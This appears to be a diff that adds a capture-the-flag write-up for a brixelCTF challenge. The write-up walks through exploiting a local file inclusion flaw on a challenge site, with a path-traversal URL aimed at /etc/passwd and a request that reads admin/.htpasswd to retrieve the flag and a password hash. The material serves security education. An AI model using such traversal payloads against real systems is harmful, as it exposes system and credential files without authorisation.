@@ -47,3 +47,45 @@ brixelCTF{lamejoke}
 ```
 
 ## Internet 15: Pathfinders #1
+**Challenge**
+These f*cking religious sects!
+
+These guys brainwashed my niece into their demeted world of i-readings and other such nonsense.
+
+The feds recently closed their churches, but it seems they are preparing for a new online platform to continue their malicious activities.
+
+can you gain access to their admin panel to shut them down?
+
+Their website is: http://timesink.be/pathfinder/
+
+**Solution**
+Navigating to the pathfinders homepage, it is immediately evident that the challenge is going to involve some sort of local file inclusion(LFI).  I assume this, because we have control over the page paremeter in the URL.  Using the members/locations links, the page paremeter changes to members.php and locations.php respectively.  
+First thing I tried was to find the passwd file, just to see if there was a LFI vulnerability.
+```
+http://timesink.be/pathfinder/index.php?page=../../../../../../etc/passwd
+```
+
+This results in a hint from the creator, but I guess I'm on the wrong path
+```
+naughty, naughty! you're only supposed to go after stuff in admin! no back traversing!/
+```
+
+Based on that hint, I started trying to find files in the admin folder, starting with the index page for the admin portal:
+```
+http://timesink.be/pathfinder/index.php?page=admin/index.php
+```
+This looks like I'm on the right path, but not quite there:
+```
+There is nothing here! not even bonus points I'm afraid :( you should get the password, not the page.
+```
+So if I'm trying to find the password, I figured I should look for config files. I first thought I needed to brute force the admin directory, looking for a php file that would contain a password. However, while manually fuzzing the directory I found the solution
+```
+http://timesink.be/pathfinder/index.php?page=admin/.htpasswd
+```
+
+
+**Flag**
+```
+#normally you would brute force this, but that is not in scope of this challenge. The flag is: brixelCTF{unsafe_include}
+admin:$apr1$941ydmlw$aPUW.gCFcvUbIcP0ptVQF0
+```
